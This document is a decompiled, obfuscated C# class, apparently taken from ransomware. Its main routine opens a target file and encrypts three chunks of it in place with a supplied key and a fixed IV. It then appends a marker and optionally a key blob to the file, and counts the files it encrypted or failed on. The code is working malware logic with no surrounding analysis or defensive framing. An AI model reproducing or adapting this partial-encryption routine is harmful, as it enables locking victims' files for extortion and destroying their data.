using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using UCYqwUXrppN;

namespace eltZnUpwRizyZ;

internal sealed class iJsQqEPvGCEvi
{
	[NonSerialized]
	internal static GetString _0088;

	public static int nYPmyHMrQj(long P_0)
	{
		return (int)P_0;
	}

	public static bool CbPjLHJdSiaV(string JpZNvrfHXQ, string ZXnzfGQOlZBC, string nljvBVmZSaBU, byte[] WUPlPpKNwCKR = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(JpZNvrfHXQ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = nYPmyHMrQj(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(ZXnzfGQOlZBC) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(ZXnzfGQOlZBC) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(ZXnzfGQOlZBC) * 1024 * 1024) / 10;
				}
				int num3 = 32;
				int yqBfoocEBb = (int)Math.Round((double)num2 / (double)num3, MidpointRounding.AwayFromZero) * num3;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] array2 = RkzpQWrnHOc(JpZNvrfHXQ, fileStream, yqBfoocEBb, num * i);
					array = (OPwDdsoVlNU.LZWNsbTTjOGKx ? SORyNXckDwab.kxKjqVUBRvIzUxx(array2, Encoding.ASCII.GetBytes(nljvBVmZSaBU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ujXrqFZLIuhev.jsetmJbXIvBqD(array2, Encoding.ASCII.GetBytes(nljvBVmZSaBU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					ASQKnEZGOOBLi(JpZNvrfHXQ, fileStream, array, num * i);
				}
			}
			byte[] array3 = null;
			array3 = (OPwDdsoVlNU.OmLPyoScyL ? Encoding.ASCII.GetBytes(OPwDdsoVlNU.KsnoBrbTQSaN(_0088(107398777)) + OPwDdsoVlNU.KsnoBrbTQSaN(_0088(107399930)) + Convert.ToString(ZXnzfGQOlZBC) + OPwDdsoVlNU.KsnoBrbTQSaN(_0088(107399930))) : Encoding.ASCII.GetBytes(OPwDdsoVlNU.KsnoBrbTQSaN(_0088(107398777)) + OPwDdsoVlNU.KsnoBrbTQSaN(_0088(107399907)) + Convert.ToString(ZXnzfGQOlZBC) + OPwDdsoVlNU.KsnoBrbTQSaN(_0088(107399907))));
			if (!OPwDdsoVlNU.OmLPyoScyL)
			{
				using FileStream fileStream2 = new FileStream(JpZNvrfHXQ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array3, 0, array3.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(JpZNvrfHXQ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(WUPlPpKNwCKR, 0, WUPlPpKNwCKR.Length);
				fileStream3.Write(array3, 0, array3.Length);
			}
		}
		catch (Exception ex)
		{
			if (OPwDdsoVlNU.QCmKQKwvWBrFEj)
			{
				try
				{
					File.AppendAllText(OPwDdsoVlNU.hBPcxbXfrBbYZwL, _0088(107385671) + JpZNvrfHXQ + _0088(107398732) + ex.Message + _0088(107396287));
				}
				catch (Exception)
				{
				}
			}
			OPwDdsoVlNU.WetxdZxAdgUqT++;
			return false;
		}
		OPwDdsoVlNU.JSBuxhHRYzkt++;
		return true;
	}

	public static byte[] RkzpQWrnHOc(string haOSQASlCdfgo, FileStream fHndYydQsufbh, int YqBfoocEBb, int FeeHAXiuJpjj = 0)
	{
		byte[] array = new byte[YqBfoocEBb];
		fHndYydQsufbh.Position = FeeHAXiuJpjj;
		fHndYydQsufbh.Read(array, 0, YqBfoocEBb);
		return array;
	}

	public static void ASQKnEZGOOBLi(string gRekjytiHIfQZJ, FileStream xEjyvNTxgaT, byte[] mzEWoXHJmFrxB, int YYKcpPMtxEqJGAKSvC = 0)
	{
		xEjyvNTxgaT.Position = YYKcpPMtxEqJGAKSvC;
		xEjyvNTxgaT.Write(mzEWoXHJmFrxB, 0, mzEWoXHJmFrxB.Length);
	}

	static iJsQqEPvGCEvi()
	{
		Strings.CreateGetStringDelegate(typeof(iJsQqEPvGCEvi));
	}
}
